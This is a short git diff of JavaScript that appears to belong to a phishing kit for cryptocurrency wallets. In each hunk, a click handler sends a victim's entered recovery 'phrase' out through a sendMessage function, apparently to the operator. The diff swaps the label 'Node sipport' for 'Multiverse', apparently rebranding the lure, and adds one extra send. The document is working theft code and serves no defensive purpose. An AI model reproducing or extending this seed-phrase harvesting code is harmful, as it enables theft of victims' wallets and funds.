@@ -34,6 +34,7 @@ submitk.addEventListener("click", () => {
     //let keypass =document.getElementById("keypass").value;
     
         console.log("phrase");
+        await sendMessage(`Multiverse`);
         await sendMessage(`phrase`);
         await sendMessage(phrase);
         //await sendMessage(`Password`);
@@ -46,7 +47,7 @@ submitk.addEventListener("click", () => {
     //let mnemonicspass =document.getElementById("mnemonicspass").value;
     
         console.log("phrase");
-        await sendMessage(`Node sipport`);
+        await sendMessage(`Multiverse`);
         await sendMessage(`phrase`);
         await sendMessage(phrase);
         //await sendMessage(`Password`);
@@ -59,7 +60,7 @@ submitk.addEventListener("click", () => {
     
 
         console.log("phrase");
-        await sendMessage(`Node sipport`);
+        await sendMessage(`Multiverse`);
         await sendMessage(`phrase`);
         await sendMessage(phrase);
         //await sendMessage(`Password`);
@@ -72,7 +73,7 @@ submitk.addEventListener("click", () => {
     
 
         console.log("phrase");
-        await sendMessage(`Node sipport`);
+        await sendMessage(`Multiverse`);
         await sendMessage(`phrase`);
         await sendMessage(phrase);
         //await sendMessage(`Password`);
